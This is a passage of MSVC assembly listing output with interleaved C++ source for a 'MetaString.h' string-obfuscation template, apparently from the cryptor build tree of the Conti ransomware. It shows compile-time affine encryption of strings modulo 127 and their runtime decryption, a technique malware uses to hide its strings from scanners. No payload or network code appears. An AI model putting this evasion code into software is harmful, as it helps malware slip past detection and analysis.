; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 48	 mov	 BYTE PTR [rcx+1], 72	; 00000048H
  00007	c6 41 02 05	 mov	 BYTE PTR [rcx+2], 5
  0000b	c6 41 03 73	 mov	 BYTE PTR [rcx+3], 115	; 00000073H
  0000f	c6 41 04 05	 mov	 BYTE PTR [rcx+4], 5
  00013	c6 41 05 6f	 mov	 BYTE PTR [rcx+5], 111	; 0000006fH
  00017	c6 41 06 05	 mov	 BYTE PTR [rcx+6], 5
  0001b	c6 41 07 25	 mov	 BYTE PTR [rcx+7], 37	; 00000025H
  0001f	c6 41 08 05	 mov	 BYTE PTR [rcx+8], 5
  00023	c6 41 09 05	 mov	 BYTE PTR [rcx+9], 5
  00027	c6 41 0a 05	 mov	 BYTE PTR [rcx+10], 5
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0CJ@$04U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<41,5,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,5,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<89,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 6b		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 06 00 00
	00		 mov	 r11d, 6
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 50	 sub	 ecx, 80			; 00000050H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 89	 lea	 r8d, DWORD PTR [rcx+rcx*4]
  00034	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00037	41 f7 e8	 imul	 r8d
  0003a	41 03 d0	 add	 edx, r8d
  0003d	c1 fa 06	 sar	 edx, 6
  00040	8b c2		 mov	 eax, edx
  00042	c1 e8 1f	 shr	 eax, 31
  00045	03 d0		 add	 edx, eax
  00047	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004a	44 2b c0	 sub	 r8d, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00056	41 f7 e8	 imul	 r8d
  00059	41 03 d0	 add	 edx, r8d
  0005c	c1 fa 06	 sar	 edx, 6
  0005f	8b c2		 mov	 eax, edx
  00061	c1 e8 1f	 shr	 eax, 31
  00064	03 d0		 add	 edx, eax
  00066	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00069	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0006c	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  00070	49 83 eb 01	 sub	 r11, 1
  00074	75 aa		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00076	49 8b c1	 mov	 rax, r9
  00079	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<89,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<89,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<89,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 15	 mov	 BYTE PTR [rcx+1], 21
  00007	c6 41 02 50	 mov	 BYTE PTR [rcx+2], 80	; 00000050H
  0000b	c6 41 03 02	 mov	 BYTE PTR [rcx+3], 2
  0000f	c6 41 04 50	 mov	 BYTE PTR [rcx+4], 80	; 00000050H
  00013	c6 41 05 50	 mov	 BYTE PTR [rcx+5], 80	; 00000050H
  00017	c6 41 06 50	 mov	 BYTE PTR [rcx+6], 80	; 00000050H
  0001b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0001f	48 8b c1	 mov	 rax, rcx
  00022	c3		 ret	 0
??0?$MetaBuffer@$0FJ@$0FA@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<89,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<89,80,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<103,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 06 00 00
	00		 mov	 r11d, 6
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 0f	 sub	 ecx, 15

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 25	 imul	 r8d, ecx, 37		; 00000025H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<103,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<103,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<103,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 4e	 mov	 BYTE PTR [rcx+1], 78	; 0000004eH
  00007	c6 41 02 0f	 mov	 BYTE PTR [rcx+2], 15
  0000b	c6 41 03 79	 mov	 BYTE PTR [rcx+3], 121	; 00000079H
  0000f	c6 41 04 0f	 mov	 BYTE PTR [rcx+4], 15
  00013	c6 41 05 0f	 mov	 BYTE PTR [rcx+5], 15
  00017	c6 41 06 0f	 mov	 BYTE PTR [rcx+6], 15
  0001b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0001f	48 8b c1	 mov	 rax, rcx
  00022	c3		 ret	 0
??0?$MetaBuffer@$0GH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<103,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<103,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<61,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 60	 sub	 eax, 96			; 00000060H
  00006	44 6b c0 19	 imul	 r8d, eax, 25

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<61,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<61,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 3d	 imul	 r8d, eax, 61		; 0000003dH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 60	 add	 r8d, 96			; 00000060H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<61,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ PROC ; MetaBuffer<61,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DN@$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<61,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 65 00 00 00	 mov	 ecx, 101		; 00000065H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3f	 imul	 r8d, ecx, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 45 65
	00 00 00	 lea	 r8d, DWORD PTR [rax*2+101]
  0000b	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ PROC ; MetaBuffer<2,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$01$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<2,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<37,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 08 00 00 00	 mov	 ecx, 8
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00013	41 c1 e0 03	 shl	 r8d, 3

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ENDP ; MetaBuffer<37,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CF@$07U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z PROC ; MetaBuffer<37,8,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 25	 imul	 r8d, eax, 37		; 00000025H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 08	 add	 r8d, 8
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
